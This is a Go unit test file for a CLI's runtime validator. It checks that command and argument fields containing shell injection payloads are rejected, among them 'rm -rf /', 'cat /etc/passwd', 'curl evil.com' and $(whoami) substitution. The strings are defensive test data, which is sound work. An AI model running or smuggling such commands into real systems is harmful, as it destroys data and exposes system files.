package service_test

import (
	"strings"
	"testing"

	"github.com/jongio/azd-app/cli/src/internal/service"
)

// TestValidateRuntime_CommandInjection tests command injection protection
func TestValidateRuntime_CommandInjection(t *testing.T) {
	tests := []struct {
		name    string
		runtime *service.ServiceRuntime
		wantErr bool
		errMsg  string
	}{
		{
			name: "Valid command",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm",
				Args:       []string{"start"},
				Language:   "js",
			},
			wantErr: false,
		},
		{
			name: "Command with semicolon injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm; rm -rf /",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Command with pipe injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm | cat /etc/passwd",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Command with ampersand injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm & curl evil.com",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Command with backtick injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm `whoami`",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Command with dollar sign injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm $(whoami)",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Command with redirect injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm > /dev/null",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Command with newline injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm\nrm -rf /",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Argument with semicolon injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "node",
				Args:       []string{"index.js; rm -rf /"},
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Argument with pipe injection attempt",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "python",
				Args:       []string{"app.py | cat /etc/passwd"},
				Language:   "python",
			},
			wantErr: true,
			errMsg:  "dangerous character",
		},
		{
			name: "Valid complex command path",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "/usr/local/bin/node",
				Args:       []string{"--experimental-modules", "index.js"},
				Language:   "js",
			},
			wantErr: false,
		},
		{
			name: "Valid command with dashes and dots",
			runtime: &service.ServiceRuntime{
				Name:       "api",
				WorkingDir: "/app",
				Command:    "uvicorn",
				Args:       []string{"main:app", "--reload", "--port=8000"},
				Language:   "python",
			},
			wantErr: false,
		},
		{
			name: "Missing name",
			runtime: &service.ServiceRuntime{
				Name:       "",
				WorkingDir: "/app",
				Command:    "npm",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "service name is required",
		},
		{
			name: "Missing working directory",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "",
				Command:    "npm",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "working directory is required",
		},
		{
			name: "Missing command",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "",
				Language:   "js",
			},
			wantErr: true,
			errMsg:  "run command is required",
		},
		{
			name: "Missing language",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm",
				Language:   "",
			},
			wantErr: true,
			errMsg:  "language is required",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := service.ValidateRuntime(tt.runtime)
			if tt.wantErr {
				if err == nil {
					t.Errorf("ValidateRuntime() expected error but got nil")
					return
				}
				if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateRuntime() error = %v, want error containing %v", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("ValidateRuntime() unexpected error = %v", err)
				}
			}
		})
	}
}

// TestValidateRuntime_EdgeCases tests edge cases
func TestValidateRuntime_EdgeCases(t *testing.T) {
	tests := []struct {
		name    string
		runtime *service.ServiceRuntime
		wantErr bool
		errMsg  string
	}{
		{
			name: "Command with spaces is valid",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "my command",
				Language:   "js",
			},
			wantErr: false,
		},
		{
			name: "Empty args array is valid",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm",
				Args:       []string{},
				Language:   "js",
			},
			wantErr: false,
		},
		{
			name: "Nil args is valid",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "npm",
				Args:       nil,
				Language:   "js",
			},
			wantErr: false,
		},
		{
			name: "Multiple valid args",
			runtime: &service.ServiceRuntime{
				Name:       "web",
				WorkingDir: "/app",
				Command:    "go",
				Args:       []string{"run", ".", "-tags=dev", "--verbose"},
				Language:   "go",
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := service.ValidateRuntime(tt.runtime)
			if tt.wantErr {
				if err == nil {
					t.Errorf("ValidateRuntime() expected error but got nil")
					return
				}
				if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateRuntime() error = %v, want error containing %v", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("ValidateRuntime() unexpected error = %v", err)
				}
			}
		})
	}
}
